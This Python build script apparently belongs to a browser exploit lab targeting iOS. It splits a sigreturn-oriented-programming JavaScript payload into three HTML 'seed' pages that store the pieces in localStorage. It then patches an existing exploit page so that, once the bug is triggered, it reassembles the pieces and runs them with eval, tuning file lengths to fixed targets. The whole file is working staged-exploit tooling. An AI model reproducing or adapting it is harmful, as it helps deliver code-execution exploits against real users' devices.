#!/usr/bin/env python3
"""Build the 3-part ROP seed inputs (one part per seed render) and the
3,969-target exploit input; the preserve-length tool pads/tunes to 3,969/1,737."""
import hashlib, json, os, re, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
SROP=open(os.path.join(PAY,'srop.js')).read(); K=(len(SROP)+2)//3
PARTS=[SROP[i*K:(i+1)*K] for i in range(3)]
KEYS=['n1s2a','n1s2b','n1s2c']
LBL=['A','B','C']
def seed(part,key,label):
    return ('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
            '<div id="v">N1IOS_SEED_'+label+'</div>\n<script>try{var P='+json.dumps(part)+';'
            'localStorage.setItem("'+key+'",P);document.getElementById("v").textContent="SEED OK '+label+' "+P.length;}'
            'catch(e){document.getElementById("v").textContent="SEED ERR "+e;}</script>\n</body></html>')
def exploit():
    b=open(os.path.join(PAY,'ls_final_h200_2036.html')).read(); a=re.findall(r'<script>(.*?)</script>',b,re.S)[0]
    old=("var s2=null; try{s2=localStorage.getItem(\"n1s2\");}catch(e){}\n"
         "if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }")
    new=('var a=null,b=null,c=null; try{a=localStorage.getItem("n1s2a");b=localStorage.getItem("n1s2b");c=localStorage.getItem("n1s2c");}catch(e){}\n'
         'globalThis.RESULT += " S2LEN="+(a===null?-1:a.length)+","+(b===null?-1:b.length)+","+(c===null?-1:c.length);\n'
         'try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}\n'
         'if(hit>=0 && a&&b&&c){ try{(0,eval)(a+b+c);}catch(e2){} }')
    assert old in a
    a=a.replace(old,new,1)
    return ('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
            '<div id="v">N1IOS_LS</div>\n<script>'+a+'</script>\n</body></html>')
if __name__=='__main__':
    for i,(p,key,label) in enumerate(zip(PARTS,KEYS,LBL)):
        h=seed(p,key,label); fn=f'ls_seed_srop3_{label.lower()}_in.html'; open(os.path.join(PAY,fn),'w').write(h)
        print(fn,'raw',len(h),'zlib9',len(zlib.compress(h.encode(),9)),'sha',hashlib.sha256(h.encode()).hexdigest(),'part',len(p))
    h=exploit(); fn='ls_final_srop3_h200_in.html'; open(os.path.join(PAY,fn),'w').write(h)
    print(fn,'raw',len(h),'zlib9',len(zlib.compress(h.encode(),9)),'sha',hashlib.sha256(h.encode()).hexdigest())
